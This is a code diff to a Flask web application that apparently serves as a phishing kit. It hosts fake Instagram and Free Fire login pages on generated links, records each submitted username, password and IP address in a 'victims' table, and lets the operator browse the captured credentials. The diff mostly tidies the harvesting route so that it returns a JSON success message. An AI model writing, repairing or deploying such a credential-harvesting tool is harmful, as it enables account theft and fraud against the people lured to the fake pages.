@@ -2,7 +2,7 @@ import os
 import uuid
 import sqlite3
 from datetime import datetime, timedelta
-from flask import Flask, render_template, request, redirect, url_for, session
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'default-fallback-secret-key-2026')
@@ -10,7 +10,6 @@ app.permanent_session_lifetime = timedelta(days=30)
 
 DB_NAME = 'phish_data.db'
 
-# -----------------  -----------------
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
@@ -41,7 +40,6 @@ def init_db():
 
 init_db()
 
-# -----------------  -----------------
 @app.route('/')
 def home():
     if 'user_id' in session:
@@ -127,6 +125,7 @@ def phish_page(link_id):
         conn.close()
         return "Invalid link", 404
     template_name = result[0]
+
     if request.method == 'POST':
         username = request.form.get('username', '')
         password = request.form.get('password', '')
@@ -135,9 +134,8 @@ def phish_page(link_id):
                   (link_id, username, password, ip, datetime.now()))
         conn.commit()
         conn.close()
-       
-            real_url = 'https://www.google.com'
-        return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
+        return jsonify({"status": "success", "message": "Information saved"})
+
     conn.close()
     if template_name == 'instagram':
         return render_template('instagram.html')
@@ -147,7 +145,7 @@ def phish_page(link_id):
         return render_template('freefire.html')
     else:
         return "Invalid template", 400
-        
+
 @app.route('/victims/<link_id>')
 def view_victims(link_id):
     if 'user_id' not in session:
@@ -170,19 +168,17 @@ def delete_link(link_id):
         return redirect(url_for('login'))
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
-    # প্রথমে দেখুন লিঙ্কটি ইউজারের কিনা
     c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
     owner = c.fetchone()
     if not owner or owner[0] != session['user_id']:
         conn.close()
         return "Unauthorized", 403
-    # ভিকটিম ডাটা আগে ডিলিট করুন (optional, কিন্তু পরিষ্কার রাখতে)
     c.execute("DELETE FROM victims WHERE link_id=?", (link_id,))
     c.execute("DELETE FROM links WHERE link_id=?", (link_id,))
     conn.commit()
     conn.close()
     return redirect(url_for('dashboard'))
-    
+
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
